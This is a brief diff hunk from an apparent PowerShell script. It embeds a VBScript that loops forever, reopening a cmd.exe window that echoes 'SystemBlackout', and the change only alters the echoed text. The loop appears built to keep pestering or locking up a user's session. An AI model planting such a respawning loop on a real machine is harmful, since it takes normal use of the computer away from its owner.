@@ -100,7 +100,7 @@ $vbsScript = @"
 Set objShell = CreateObject("WScript.Shell")
 
 Do While True
-    objShell.Run "cmd.exe /k echo SystemBlackout", 1, True
+    objShell.Run "cmd.exe /k echo SystemBlackout.exe", 1, True
 Loop
 "@
 
